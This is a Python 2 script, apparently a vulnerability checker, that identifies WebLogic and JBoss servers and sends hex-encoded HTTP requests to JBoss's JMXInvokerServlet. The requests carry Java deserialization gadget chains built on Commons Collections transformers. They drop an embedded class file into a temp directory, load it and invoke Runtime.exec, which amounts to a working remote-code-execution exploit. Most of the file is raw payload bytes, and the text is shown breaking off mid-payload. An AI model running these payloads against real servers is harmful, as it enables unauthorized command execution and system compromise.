#coding=utf-8
import requests
from sys import argv
from string import find,strip
import re
import socket
#target格式：http://host:port
class CheckApp(object):
    ''' 检测web应用组件，并检测是否可以用于漏洞检测'''
    def __init__(self,target):
        self.target = target

    def CheckWeblogic(self,target):
        '''检测weblogic控制台'''
        try:
            content=requests.get(target+"/console/login/LoginForm.jsp").content
            print content
        except:
            return False
        if  find(content,"Oracle WebLogic Server 管理控制台")!=-1 \
                or find(content,"Oracle WebLogic Server Administration Console")!=-1 \
                or find(content,"Oracle WebLogic Server")!=-1 \
                or find(content,"BEA WebLogic Server"):
            return True
        else:
            return False

    def CheckJboss(self,target):
        '''检测Jboss /invoker/JMXInvokerServlet'''
        try:
            content=requests.get(target+"/invoker/JMXInvokerServlet").content
        except:
            return False
        if content[0:21]=="\xac\xed\x00\x05sr\x00$org.jboss.inv":
            return True
        else:
            return False

    def Check(self,target):
        '''判断web中间件'''
        try:
            c=requests.get(target)
        except:
            print "Target open failed,continue......"
            return False
        if "X-Powered-By" in c.headers.keys():
            app=c.headers["X-Powered-By"]
            content=c.content
            c.close()
            if find(app,"Servlet")!=-1 and find(app,"JSP")!=-1:
                print "Web App is Weblogic"
                if self.CheckWeblogic(target):
                    print "Target is checkable"
                    return "Weblogic"
                else:
                    print "Target is no checkable"
                    return False
            elif find(app,"JBoss-")!=-1 and find(app,"Servlet")!=-1:
                print "Web App is Jboss"
                if self.CheckJboss(target):
                    print "Target is checkable"
                    return "Jboss"
                else:
                    print "Target is not checkable"
                    return False
            print "Target is not Weblogic/Jboss,continue......"
            return False
        else:
            if self.CheckWeblogic(target):
                print "Target is Wbelogic,and is checkable"
                return "Weblogic"
            elif self.CheckJboss(target):
                print "Target is Jboss and is checkable"
                return "Jboss"
            else:
                print "Target is not checkable"
                return False

class CheckVulnerability(object):
    '''检测是否存在漏洞'''
    def __init__(self,target):
        self.target=target
        self.string_ip="\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
        self.string_port=":\d+"

    def SendPayload(self,server,payload):
        soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        soc.connect(server)
        soc.send(payload)
        data=""
        while True:
            r=soc.recv(1024)
            if not r:
                break
            data=data+r
        soc.close()
        return data
    def CheckWeblogic(self,target):
        pass

    def CheckJboss(self,target):
        com_ip=re.compile(self.string_ip)
        com_port=re.compile(self.string_port)
        host=com_ip.search(target).group()
        port=int(com_port.search(target).group()[1:])
        server=(host,port)
        payload_1="47:45:54:20:2f:69:6e:76:6f:6b:65:72:2f:4a:4d:58:49:6e:76:6f:6b:65:72:53:65:72:76:6c:65:74:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:32:34:2e:32:30:37:2e:32:32:30:2e:37:31:3a:38:30:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:4b:65:65:70:2d:41:6c:69:76:65:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:41:70:61:63:68:65:2d:48:74:74:70:43:6c:69:65:6e:74:2f:34:2e:35:2e:31:20:28:4a:61:76:61:2f:31:2e:38:2e:30:5f:36:35:29:0d:0a:0d:0a"
        payload_1=payload_1.replace(":","").decode("hex")
        payload_1=payload_1.replace("124.207.220.71:80",host)
        payload_2="50:4f:53:54:20:2f:69:6e:76:6f:6b:65:72:2f:4a:4d:58:49:6e:76:6f:6b:65:72:53:65:72:76:6c:65:74:20:48:54:54:50:2f:31:2e:30:0d:0a:50:72:6f:78:79:2d:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:41:75:74:68:6f:72:69:7a:61:74:69:6f:6e:3a:20:42:61:73:69:63:20:59:57:52:74:61:57:34:36:59:57:52:74:61:57:34:3d:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:32:31:39:31:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:57:69:6e:64:6f:77:73:20:4e:54:20:31:30:2e:30:3b:20:57:69:6e:36:34:3b:20:78:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:34:36:2e:30:2e:32:34:39:30:2e:38:36:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:6a:61:76:61:2d:73:65:72:69:61:6c:69:7a:65:64:2d:6f:62:6a:65:63:74:3b:20:63:6c:61:73:73:3d:6f:72:67:2e:6a:62:6f:73:73:2e:69:6e:76:6f:63:61:74:69:6f:6e:2e:4d:61:72:73:68:61:6c:6c:65:64:56:61:6c:75:65:0d:0a:0d:0a:ac:ed:00:05:73:72:00:32:73:75:6e:2e:72:65:66:6c:65:63:74:2e:61:6e:6e:6f:74:61:74:69:6f:6e:2e:41:6e:6e:6f:74:61:74:69:6f:6e:49:6e:76:6f:63:61:74:69:6f:6e:48:61:6e:64:6c:65:72:55:ca:f5:0f:15:cb:7e:a5:02:00:02:4c:00:0c:6d:65:6d:62:65:72:56:61:6c:75:65:73:74:00:0f:4c:6a:61:76:61:2f:75:74:69:6c:2f:4d:61:70:3b:4c:00:04:74:79:70:65:74:00:11:4c:6a:61:76:61:2f:6c:61:6e:67:2f:43:6c:61:73:73:3b:78:70:73:72:00:31:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:6d:61:70:2e:54:72:61:6e:73:66:6f:72:6d:65:64:4d:61:70:61:77:3f:e0:5d:f1:5a:70:03:00:02:4c:00:0e:6b:65:79:54:72:61:6e:73:66:6f:72:6d:65:72:74:00:2c:4c:6f:72:67:2f:61:70:61:63:68:65:2f:63:6f:6d:6d:6f:6e:73:2f:63:6f:6c:6c:65:63:74:69:6f:6e:73:2f:54:72:61:6e:73:66:6f:72:6d:65:72:3b:4c:00:10:76:61:6c:75:65:54:72:61:6e:73:66:6f:72:6d:65:72:71:00:7e:00:05:78:70:70:73:72:00:3a:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:43:68:61:69:6e:65:64:54:72:61:6e:73:66:6f:72:6d:65:72:30:c7:97:ec:28:7a:97:04:02:00:01:5b:00:0d:69:54:72:61:6e:73:66:6f:72:6d:65:72:73:74:00:2d:5b:4c:6f:72:67:2f:61:70:61:63:68:65:2f:63:6f:6d:6d:6f:6e:73:2f:63:6f:6c:6c:65:63:74:69:6f:6e:73:2f:54:72:61:6e:73:66:6f:72:6d:65:72:3b:78:70:75:72:00:2d:5b:4c:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:54:72:61:6e:73:66:6f:72:6d:65:72:3b:bd:56:2a:f1:d8:34:18:99:02:00:00:78:70:00:00:00:04:73:72:00:3b:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:43:6f:6e:73:74:61:6e:74:54:72:61:6e:73:66:6f:72:6d:65:72:58:76:90:11:41:02:b1:94:02:00:01:4c:00:09:69:43:6f:6e:73:74:61:6e:74:74:00:12:4c:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:3b:78:70:76:72:00:18:6a:61:76:61:2e:69:6f:2e:46:69:6c:65:4f:75:74:70:75:74:53:74:72:65:61:6d:00:00:00:00:00:00:00:00:00:00:00:78:70:73:72:00:3a:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:49:6e:76:6f:6b:65:72:54:72:61:6e:73:66:6f:72:6d:65:72:87:e8:ff:6b:7b:7c:ce:38:02:00:03:5b:00:05:69:41:72:67:73:74:00:13:5b:4c:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:3b:4c:00:0b:69:4d:65:74:68:6f:64:4e:61:6d:65:74:00:12:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:5b:00:0b:69:50:61:72:61:6d:54:79:70:65:73:74:00:12:5b:4c:6a:61:76:61:2f:6c:61:6e:67:2f:43:6c:61:73:73:3b:78:70:75:72:00:13:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:4f:62:6a:65:63:74:3b:90:ce:58:9f:10:73:29:6c:02:00:00:78:70:00:00:00:01:75:72:00:12:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:43:6c:61:73:73:3b:ab:16:d7:ae:cb:cd:5a:99:02:00:00:78:70:00:00:00:01:76:72:00:10:6a:61:76:61:2e:6c:61:6e:67:2e:53:74:72:69:6e:67:a0:f0:a4:38:7a:3b:b3:42:02:00:00:78:70:74:00:0e:67:65:74:43:6f:6e:73:74:72:75:63:74:6f:72:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:18:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:72:00:13:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:53:74:72:69:6e:67:3b:ad:d2:56:e7:e9:1d:7b:47:02:00:00:78:70:00:00:00:01:74:00:24:63:3a:2f:77:69:6e:64:6f:77:73:2f:74:65:6d:70:2f:52:75:6e:43:68:65:63:6b:43:6f:6e:66:69:67:2e:63:6c:61:73:73:74:00:0b:6e:65:77:49:6e:73:74:61:6e:63:65:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:16:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:72:00:02:5b:42:ac:f3:17:f8:06:08:54:e0:02:00:00:78:70:00:00:03:87:ca:fe:ba:be:00:03:00:2d:00:3f:08:00:1f:07:00:2f:07:00:36:07:00:37:07:00:38:07:00:39:07:00:3a:07:00:3b:07:00:3c:0a:00:06:00:15:0a:00:09:00:15:0a:00:04:00:16:0a:00:03:00:17:0a:00:05:00:18:0a:00:09:00:19:0a:00:08:00:1a:0a:00:07:00:1b:0a:00:08:00:1c:0a:00:03:00:1d:0a:00:09:00:1e:0c:00:29:00:23:0c:00:29:00:24:0c:00:29:00:25:0c:00:29:00:28:0c:00:32:00:27:0c:00:33:00:26:0c:00:34:00:20:0c:00:35:00:21:0c:00:3d:00:22:0c:00:3e:00:22:01:00:01:0a:01:00:17:28:29:4c:6a:61:76:61:2f:69:6f:2f:49:6e:70:75:74:53:74:72:65:61:6d:3b:01:00:15:28:29:4c:6a:61:76:61:2f:6c:61:6e:67:2f:52:75:6e:74:69:6d:65:3b:01:00:14:28:29:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:01:00:03:28:29:56:01:00:18:28:4c:6a:61:76:61:2f:69:6f:2f:49:6e:70:75:74:53:74:72:65:61:6d:3b:29:56:01:00:13:28:4c:6a:61:76:61:2f:69:6f:2f:52:65:61:64:65:72:3b:29:56:01:00:27:28:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:29:4c:6a:61:76:61:2f:6c:61:6e:67:2f:50:72:6f:63:65:73:73:3b:01:00:2c:28:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:29:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:42:75:66:66:65:72:3b:01:00:15:28:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:29:56:01:00:06:3c:69:6e:69:74:3e:01:00:04:43:6f:64:65:01:00:0d:43:6f:6e:73:74:61:6e:74:56:61:6c:75:65:01:00:0a:45:78:63:65:70:74:69:6f:6e:73:01:00:0f:4c:69:6e:65:4e:75:6d:62:65:72:54:61:62:6c:65:01:00:0e:4c:6f:63:61:6c:56:61:72:69:61:62:6c:65:73:01:00:0e:52:75:6e:43:68:65:63:6b:43:6f:6e:66:69:67:01:00:13:52:75:6e:43:68:65:63:6b:43:6f:6e:66:69:67:2e:6a:61:76:61:01:00:0a:53:6f:75:72:63:65:46:69:6c:65:01:00:06:61:70:70:65:6e:64:01:00:04:65:78:65:63:01:00:0e:67:65:74:49:6e:70:75:74:53:74:72:65:61:6d:01:00:0a:67:65:74:52:75:6e:74:69:6d:65:01:00:16:6a:61:76:61:2f:69:6f:2f:42:75:66:66:65:72:65:64:52:65:61:64:65:72:01:00:19:6a:61:76:61:2f:69:6f:2f:49:6e:70:75:74:53:74:72:65:61:6d:52:65:61:64:65:72:01:00:13:6a:61:76:61:2f:6c:61:6e:67:2f:45:78:63:65:70:74:69:6f:6e:01:00:10:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:01:00:11:6a:61:76:61:2f:6c:61:6e:67:2f:50:72:6f:63:65:73:73:01:00:11:6a:61:76:61:2f:6c:61:6e:67:2f:52:75:6e:74:69:6d:65:01:00:16:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:42:75:66:66:65:72:01:00:08:72:65:61:64:4c:69:6e:65:01:00:08:74:6f:53:74:72:69:6e:67:00:21:00:02:00:06:00:00:00:00:00:01:00:01:00:29:00:28:00:02:00:2a:00:00:00:6f:00:05:00:08:00:00:00:57:2a:b7:00:0a:b8:00:12:2b:b6:00:10:4d:bb:00:03:59:bb:00:04:59:2c:b6:00:11:b7:00:0c:b7:00:0d:4e:bb:00:09:59:b7:00:0b:3a:04:a7:00:10:19:04:19:05:b6:00:0f:12:01:b6:00:0f:57:2d:b6:00:13:59:3a:05:c7:ff:ec:19:04:b6:00:14:3a:06:bb:00:05:59:19:06:b7:00:0e:3a:07:19:07:bf:00:00:00:01:00:2d:00:00:00:06:00:01:00:00:00:01:00:2c:00:00:00:04:00:01:00:05:00:01:00:31:00:00:00:02:00:30:74:00:05:77:72:69:74:65:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:29:73:72:00:11:6a:61:76:61:2e:75:74:69:6c:2e:48:61:73:68:4d:61:70:05:07:da:c1:c3:16:60:d1:03:00:02:46:00:0a:6c:6f:61:64:46:61:63:74:6f:72:49:00:09:74:68:72:65:73:68:6f:6c:64:78:70:3f:40:00:00:00:00:00:0c:77:08:00:00:00:10:00:00:00:01:74:00:05:76:61:6c:75:65:71:00:7e:00:30:78:78:76:72:00:1e:6a:61:76:61:2e:6c:61:6e:67:2e:61:6e:6e:6f:74:61:74:69:6f:6e:2e:52:65:74:65:6e:74:69:6f:6e:00:00:00:00:00:00:00:00:00:00:00:78:70"
        payload_2=payload_2.replace(":","").decode("hex")
        payload_3_linux="50:4f:53:54:20:2f:69:6e:76:6f:6b:65:72:2f:4a:4d:58:49:6e:76:6f:6b:65:72:53:65:72:76:6c:65:74:20:48:54:54:50:2f:31:2e:30:0d:0a:50:72:6f:78:79:2d:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:41:75:74:68:6f:72:69:7a:61:74:69:6f:6e:3a:20:42:61:73:69:63:20:59:57:52:74:61:57:34:36:59:57:52:74:61:57:34:3d:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:35:30:34:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:57:69:6e:64:6f:77:73:20:4e:54:20:31:30:2e:30:3b:20:57:69:6e:36:34:3b:20:78:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:34:36:2e:30:2e:32:34:39:30:2e:38:36:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:6a:61:76:61:2d:73:65:72:69:61:6c:69:7a:65:64:2d:6f:62:6a:65:63:74:3b:20:63:6c:61:73:73:3d:6f:72:67:2e:6a:62:6f:73:73:2e:69:6e:76:6f:63:61:74:69:6f:6e:2e:4d:61:72:73:68:61:6c:6c:65:64:56:61:6c:75:65:0d:0a:0d:0a:ac:ed:00:05:73:72:00:32:73:75:6e:2e:72:65:66:6c:65:63:74:2e:61:6e:6e:6f:74:61:74:69:6f:6e:2e:41:6e:6e:6f:74:61:74:69:6f:6e:49:6e:76:6f:63:61:74:69:6f:6e:48:61:6e:64:6c:65:72:55:ca:f5:0f:15:cb:7e:a5:02:00:02:4c:00:0c:6d:65:6d:62:65:72:56:61:6c:75:65:73:74:00:0f:4c:6a:61:76:61:2f:75:74:69:6c:2f:4d:61:70:3b:4c:00:04:74:79:70:65:74:00:11:4c:6a:61:76:61:2f:6c:61:6e:67:2f:43:6c:61:73:73:3b:78:70:73:72:00:31:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:6d:61:70:2e:54:72:61:6e:73:66:6f:72:6d:65:64:4d:61:70:61:77:3f:e0:5d:f1:5a:70:03:00:02:4c:00:0e:6b:65:79:54:72:61:6e:73:66:6f:72:6d:65:72:74:00:2c:4c:6f:72:67:2f:61:70:61:63:68:65:2f:63:6f:6d:6d:6f:6e:73:2f:63:6f:6c:6c:65:63:74:69:6f:6e:73:2f:54:72:61:6e:73:66:6f:72:6d:65:72:3b:4c:00:10:76:61:6c:75:65:54:72:61:6e:73:66:6f:72:6d:65:72:71:00:7e:00:05:78:70:70:73:72:00:3a:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:43:68:61:69:6e:65:64:54:72:61:6e:73:66:6f:72:6d:65:72:30:c7:97:ec:28:7a:97:04:02:00:01:5b:00:0d:69:54:72:61:6e:73:66:6f:72:6d:65:72:73:74:00:2d:5b:4c:6f:72:67:2f:61:70:61:63:68:65:2f:63:6f:6d:6d:6f:6e:73:2f:63:6f:6c:6c:65:63:74:69:6f:6e:73:2f:54:72:61:6e:73:66:6f:72:6d:65:72:3b:78:70:75:72:00:2d:5b:4c:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:54:72:61:6e:73:66:6f:72:6d:65:72:3b:bd:56:2a:f1:d8:34:18:99:02:00:00:78:70:00:00:00:06:73:72:00:3b:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:43:6f:6e:73:74:61:6e:74:54:72:61:6e:73:66:6f:72:6d:65:72:58:76:90:11:41:02:b1:94:02:00:01:4c:00:09:69:43:6f:6e:73:74:61:6e:74:74:00:12:4c:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:3b:78:70:76:72:00:17:6a:61:76:61:2e:6e:65:74:2e:55:52:4c:43:6c:61:73:73:4c:6f:61:64:65:72:00:00:00:00:00:00:00:00:00:00:00:78:70:73:72:00:3a:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:49:6e:76:6f:6b:65:72:54:72:61:6e:73:66:6f:72:6d:65:72:87:e8:ff:6b:7b:7c:ce:38:02:00:03:5b:00:05:69:41:72:67:73:74:00:13:5b:4c:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:3b:4c:00:0b:69:4d:65:74:68:6f:64:4e:61:6d:65:74:00:12:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:5b:00:0b:69:50:61:72:61:6d:54:79:70:65:73:74:00:12:5b:4c:6a:61:76:61:2f:6c:61:6e:67:2f:43:6c:61:73:73:3b:78:70:75:72:00:13:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:4f:62:6a:65:63:74:3b:90:ce:58:9f:10:73:29:6c:02:00:00:78:70:00:00:00:01:75:72:00:12:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:43:6c:61:73:73:3b:ab:16:d7:ae:cb:cd:5a:99:02:00:00:78:70:00:00:00:01:76:72:00:0f:5b:4c:6a:61:76:61:2e:6e:65:74:2e:55:52:4c:3b:52:51:fd:24:c5:1b:68:cd:02:00:00:78:70:74:00:0e:67:65:74:43:6f:6e:73:74:72:75:63:74:6f:72:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:18:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:1a:00:00:00:01:73:72:00:0c:6a:61:76:61:2e:6e:65:74:2e:55:52:4c:96:25:37:36:1a:fc:e4:72:03:00:07:49:00:08:68:61:73:68:43:6f:64:65:49:00:04:70:6f:72:74:4c:00:09:61:75:74:68:6f:72:69:74:79:71:00:7e:00:13:4c:00:04:66:69:6c:65:71:00:7e:00:13:4c:00:04:68:6f:73:74:71:00:7e:00:13:4c:00:08:70:72:6f:74:6f:63:6f:6c:71:00:7e:00:13:4c:00:03:72:65:66:71:00:7e:00:13:78:70:ff:ff:ff:ff:ff:ff:ff:ff:70:74:00:05:2f:74:6d:70:2f:74:00:00:74:00:04:66:69:6c:65:70:78:74:00:0b:6e:65:77:49:6e:73:74:61:6e:63:65:75:71:00:7e:00:18:00:00:00:01:76:71:00:7e:00:16:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:74:00:0e:52:75:6e:43:68:65:63:6b:43:6f:6e:66:69:67:74:00:09:6c:6f:61:64:43:6c:61:73:73:75:71:00:7e:00:18:00:00:00:01:76:72:00:10:6a:61:76:61:2e:6c:61:6e:67:2e:53:74:72:69:6e:67:a0:f0:a4:38:7a:3b:b3:42:02:00:00:78:70:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:18:00:00:00:01:71:00:7e:00:31:71:00:7e:00:1c:75:71:00:7e:00:18:00:00:00:01:71:00:7e:00:1e:73:71:00:7e:00:11:75:71:00:7e:00:16:00:00:00:01:75:71:00:7e:00:16:00:00:00:01:74:00:08:69:66:63:6f:6e:66:69:67:71:00:7e:00:28:75:71:00:7e:00:18:00:00:00:01:71:00:7e:00:2a:73:72:00:11:6a:61:76:61:2e:75:74:69:6c:2e:48:61:73:68:4d:61:70:05:07:da:c1:c3:16:60:d1:03:00:02:46:00:0a:6c:6f:61:64:46:61:63:74:6f:72:49:00:09:74:68:72:65:73:68:6f:6c:64:78:70:3f:40:00:00:00:00:00:0c:77:08:00:00:00:10:00:00:00:01:74:00:05:76:61:6c:75:65:71:00:7e:00:3d:78:78:76:72:00:1e:6a:61:76:61:2e:6c:61:6e:67:2e:61:6e:6e:6f:74:61:74:69:6f:6e:2e:52:65:74:65:6e:74:69:6f:6e:00:00:00:00:00:00:00:00:00:00:00:78:70"
        payload_3_linux=payload_3_linux.replace(":","").decode("hex")
        payload_3_windows="50:4f:53:54:20:2f:69:6e:76:6f:6b:65:72:2f:4a:4d:58:49:6e:76:6f:6b:65:72:53:65:72:76:6c:65:74:20:48:54:54:50:2f:31:2e:30:0d:0a:50:72:6f:78:79:2d:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:41:75:74:68:6f:72:69:7a:61:74:69:6f:6e:3a:20:42:61:73:69:63:20:59:57:52:74:61:57:34:36:59:57:52:74:61:57:34:3d:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:35:31:36:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:57:69:6e:64:6f:77:73:20:4e:54:20:31:30:2e:30:3b:20:57:69:6e:36:34:3b:20:78:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:34:36:2e:30:2e:32:34:39:30:2e:38:36:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:6a:61:76:61:2d:73:65:72:69:61:6c:69:7a:65:64:2d:6f:62:6a:65:63:74:3b:20:63:6c:61:73:73:3d:6f:72:67:2e:6a:62:6f:73:73:2e:69:6e:76:6f:63:61:74:69:6f:6e:2e:4d:61:72:73:68:61:6c:6c:65:64:56:61:6c:75:65:0d:0a:0d:0a:ac:ed:00:05:73:72:00:32:73:75:6e:2e:72:65:66:6c:65:63:74:2e:61:6e:6e:6f:74:61:74:69:6f:6e:2e:41:6e:6e:6f:74:61:74:69:6f:6e:49:6e:76:6f:63:61:74:69:6f:6e:48:61:6e:64:6c:65:72:55:ca:f5:0f:15:cb:7e:a5:02:00:02:4c:00:0c:6d:65:6d:62:65:72:56:61:6c:75:65:73:74:00:0f:4c:6a:61:76:61:2f:75:74:69:6c:2f:4d:61:70:3b:4c:00:04:74:79:70:65:74:00:11:4c:6a:61:76:61:2f:6c:61:6e:67:2f:43:6c:61:73:73:3b:78:70:73:72:00:31:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:6d:61:70:2e:54:72:61:6e:73:66:6f:72:6d:65:64:4d:61:70:61:77:3f:e0:5d:f1:5a:70:03:00:02:4c:00:0e:6b:65:79:54:72:61:6e:73:66:6f:72:6d:65:72:74:00:2c:4c:6f:72:67:2f:61:70:61:63:68:65:2f:63:6f:6d:6d:6f:6e:73:2f:63:6f:6c:6c:65:63:74:69:6f:6e:73:2f:54:72:61:6e:73:66:6f:72:6d:65:72:3b:4c:00:10:76:61:6c:75:65:54:72:61:6e:73:66:6f:72:6d:65:72:71:00:7e:00:05:78:70:70:73:72:00:3a:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:43:68:61:69:6e:65:64:54:72:61:6e:73:66:6f:72:6d:65:72:30:c7:97:ec:28:7a:97:04:02:00:01:5b:00:0d:69:54:72:61:6e:73:66:6f:72:6d:65:72:73:74:00:2d:5b:4c:6f:72:67:2f:61:70:61:63:68:65:2f:63:6f:6d:6d:6f:6e:73:2f:63:6f:6c:6c:65:63:74:69:6f:6e:73:2f:54:72:61:6e:73:66:6f:72:6d:65:72:3b:78:70:75:72:00:2d:5b:4c:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:54:72:61:6e:73:66:6f:72:6d:65:72:3b:bd:56:2a:f1:d8:34:18:99:02:00:00:78:70:00:00:00:06:73:72:00:3b:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:43:6f:6e:73:74:61:6e:74:54:72:61:6e:73:66:6f:72:6d:65:72:58:76:90:11:41:02:b1:94:02:00:01:4c:00:09:69:43:6f:6e:73:74:61:6e:74:74:00:12:4c:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:3b:78:70:76:72:00:17:6a:61:76:61:2e:6e:65:74:2e:55:52:4c:43:6c:61:73:73:4c:6f:61:64:65:72:00:00:00:00:00:00:00:00:00:00:00:78:70:73:72:00:3a:6f:72:67:2e:61:70:61:63:68:65:2e:63:6f:6d:6d:6f:6e:73:2e:63:6f:6c:6c:65:63:74:69:6f:6e:73:2e:66:75:6e:63:74:6f:72:73:2e:49:6e:76:6f:6b:65:72:54:72:61:6e:73:66:6f:72:6d:65:72:87:e8:ff:6b:7b:7c:ce:38:02:00:03:5b:00:05:69:41:72:67:73:74:00:13:5b:4c:6a:61:76:61:2f:6c:61:6e:67:2f:4f:62:6a:65:63:74:3b:4c:00:0b:69:4d:65:74:68:6f:64:4e:61:6d:65:74:00:12:4c:6a:61:76:61:2f:6c:61:6e:67:2f:53:74:72:69:6e:67:3b:5b:00:0b:69:50:61:72:61:6d:54:79:70:65:73:74:00:12:5b:4c:6a:61:76:61:2f:6c:61:6e:67:2f:43:6c:61:73:73:3b:78:70:75:72:00:13:5b:4c:6a:61:76:61:2e:6c:61:6e:67:2e:4f:62:6a:65:63:74:3b:90:ce:58:9f:10:73:29:6c:02:00:00:78:70